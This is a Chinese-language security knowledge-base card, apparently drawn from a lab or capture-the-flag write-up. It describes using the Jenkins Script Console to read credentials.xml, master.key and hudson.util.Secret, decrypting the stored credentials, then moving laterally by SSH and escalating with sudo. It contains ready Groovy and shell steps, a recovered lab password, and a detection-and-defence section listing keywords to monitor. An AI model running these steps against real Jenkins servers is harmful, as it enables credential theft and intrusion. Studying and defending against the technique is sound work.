---
id: web-java-component-jenkins-script-console-master-key-credential-decrypt
title: Jenkins 管理员 Script Console 读取 master.key/hudson.util.Secret 解密 credentials.xml 取凭据横向
type: scenario
domain: web
path: web/java/component
technique: jenkins-script-console-master-key-credential-decrypt
aliases:
- Jenkins Script Console 读密钥
- credentials.xml 解密
- hudson.util.Secret 解密
- Jenkins master.key 凭据窃取
- Jenkins 后台凭据横向
- shentou.py Jenkins
tags:
- java
- jenkins
- script-console
- groovy
- credentials
- master-key
- credential-decrypt
- lateral-movement
- ssh
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V247
  verified_at: '2026-11-07T12:39:38+08:00'
  notes: 已对照原文核对：Script Console 依次 cat credentials.xml/secret.key/secrets/master.key/secrets/hudson.util.Secret，shentou.py master.key hudson.util.Secret 1.xml 输出 8A2G0RNDocDjiaKd，SSH idss + sudo su + cat /root/flag，均与截图一致；无版本/CVE。未验证点：未在本机运行解密脚本；frontmatter 无 sources/source_url。
---

## 一句话结论

拿到 Jenkins 管理员权限（或 Script Console 执行权限）后，在 Script Console 里用 Groovy 执行 `cat` 读取 `credentials.xml`、`secret.key`、`secrets/master.key`、`secrets/hudson.util.Secret`，再用 Jenkins 凭据解密脚本以 `master.key + hudson.util.Secret + credentials.xml` 还原出明文口令；原文用还原出的口令 SSH 登录 `idss` 账号，`sudo su` 提权到 root 并读取 flag。

## 原理

- **Script Console 是 Jenkins 的任意 Groovy 执行入口**：管理员在 `Manage Jenkins → Script Console` 提交的 Groovy 脚本在 Jenkins JVM 内执行，权限为 Jenkins 进程的 OS 用户；Groovy 的 `String.execute()` 可调用系统命令，`new File(...).text` 可直接读文件。因此只要拿到这个入口，就能读取 Jenkins 家目录下的所有密钥文件。
- **Jenkins 凭据的加密层次**：
  - `credentials.xml` 保存凭据条目，`<password>`/`<secret>` 等字段是密文（通常以 `{AQAAAB...}` 形式出现）；
  - `secrets/hudson.util.Secret` 是用于加密凭据的 `hudson.util.Secret`，它本身以密文形式存储；
  - `secrets/master.key` 是 Jenkins 实例的主密钥，用于解密 `hudson.util.Secret`；
  - `secret.key` 是实例身份密钥（部分加密/签名场景使用）。
  只拿到 `credentials.xml` 无法解密；必须同时拿到 `master.key` 与 `hudson.util.Secret`，这也是为什么 Script Console 的读文件能力直接把“后台权限”升级为“凭据明文”。
- **解密脚本**：公开的 `jenkins_credential.py` / 原文的 `shentou.py` 读取 `master.key`、`hudson.util.Secret` 和 `credentials.xml`，按 Jenkins 的 AES 加密流程解密每个凭据条目，输出用户名/口令或私钥。原文命令 `python .\shentou.py master.key hudson.util.Secret 1.xml` 输出了明文口令 `8A2G0RNDocDjiaKd`。
- **凭据复用**：解出的口令属于 `idss` 账号，可直接 SSH 登录另一台主机；登录后 `sudo su` 成功，说明该账号有 sudo 权限或可免密提权，最终读取 `/root/flag`。这一步把 Jenkins 的凭据库变成了横向移动的跳板。
- **为什么成立**：Jenkins 默认把凭据加密密钥放在同一台机器的 `JENKINS_HOME` 下，任何能读这些文件并执行 Groovy 的管理员都能解密；Script Console 本身是设计上的管理功能，不是漏洞，但一旦管理员账号被弱口令/泄露凭据接管，凭据库就等同明文。

## 触发条件

- 已获得 Jenkins 管理员权限，或至少拥有 Script Console 执行权限（`Overall/Administer` 或脚本审批）。
- Jenkins 家目录下存在 `credentials.xml`、`secrets/master.key`、`secrets/hudson.util.Secret`、`secret.key`（默认安装即有；未使用外部凭据提供者）。
- Script Console 未被禁用，且 Groovy 沙箱/脚本审批允许执行 `execute()` 或文件读取。
- 解出的凭据在目标网络内可复用（SSH、数据库、其他 Web 后台），且目标账号有提权路径（sudo 等）。
- 需要能下载/复制密钥文件到本地运行解密脚本（或直接在目标上运行脚本）。

## 利用步骤

1. 用泄露的 Basic 凭据/弱口令登录 Jenkins，确认当前用户有管理员权限，进入 `Manage Jenkins → Script Console`。
2. 在 Script Console 依次读取关键文件（Groovy）：
   - `println new File(System.getenv('JENKINS_HOME'), 'credentials.xml').text`
   - `println new File(System.getenv('JENKINS_HOME'), 'secrets/master.key').text`
   - `println new File(System.getenv('JENKINS_HOME'), 'secrets/hudson.util.Secret').text`
   - 或原文的 `println 'cat credentials.xml'.execute().text` 等。
3. 把 `credentials.xml`、`master.key`、`hudson.util.Secret` 保存到本地同一目录。
4. 运行解密脚本：`python jenkins_credential.py master.key hudson.util.Secret credentials.xml`（原文 `shentou.py master.key hudson.util.Secret 1.xml`），得到各凭据的用户名/明文口令/私钥。
5. 用解出的 `idss` 口令 SSH 登录目标主机；执行 `sudo su` 提权到 root。
6. 读取 `/root/flag` 或继续用该主机上的凭据/密钥横向。

## PoC

```groovy
// Jenkins Script Console
def home = System.getenv('JENKINS_HOME')
println new File(home, 'credentials.xml').text
println new File(home, 'secrets/master.key').text
println new File(home, 'secrets/hudson.util.Secret').text
println new File(home, 'secret.key').text

// 或直接执行 shell（原文用法）
println 'cat credentials.xml'.execute().text
println 'cat secrets/master.key'.execute().text
println 'cat secrets/hudson.util.Secret'.execute().text
```

```bash
# 本地解密（使用公开 jenkins_credential.py 或同类脚本）
python jenkins_credential.py master.key hudson.util.Secret credentials.xml
# 原文输出示例：8A2G0RNDocDjiaKd

ssh idss@192.168.66.128
sudo su
cat /root/flag
```

## 变体与关联

- 若没有管理员权限，可先用 Jenkins CLI `@` 参数任意文件读取（CVE-2024-23897，库内已有卡）读取同样的 `credentials.xml`/`master.key`/`hudson.util.Secret`，再走本卡的解密步骤；两条路径的最终 sink 相同，入口不同。
- 若 Jenkins 使用外部凭据提供者（HashiCorp Vault、AWS Secrets Manager 等），`credentials.xml` 中可能只有引用，解密脚本拿不到实际明文；此时转向攻击外部凭据提供者。
- 解出的凭据可能是用户名口令、SSH 私钥、Secret text、证书；优先尝试 SSH/数据库/其他 Jenkins/云平台。
- 与库内 Jenkins CLI 任意文件读取卡的区别：本卡假设已有管理员 Script Console，重点在“读密钥 + 解密凭据 + 横向”，不是文件读取漏洞本身。

## 检测与防御

- **限制 Script Console**：仅超级管理员可用；生产环境禁用或加脚本审批；审计 Groovy 脚本提交与执行记录。
- **保护密钥文件**：`JENKINS_HOME/secrets/` 权限最小化；使用外部凭据提供者，避免凭据可被本地密钥解密；定期轮换 `master.key` 与所有凭据。
- **账号与网络**：Jenkins 管理员使用强口令/MFA；Jenkins 进程降权；限制 Jenkins 到内网的横向访问；SSH 禁止口令登录或限制来源。
- **检测**：监控 Script Console 中出现 `credentials.xml`、`master.key`、`hudson.util.Secret`、`execute()` 等关键字；告警异常的管理员登录与脚本执行；审计 `credentials.xml` 读取。
- **应急**：确认泄露后立即轮换所有 Jenkins 凭据与 `master.key`，吊销相关 SSH key，排查横向登录日志。
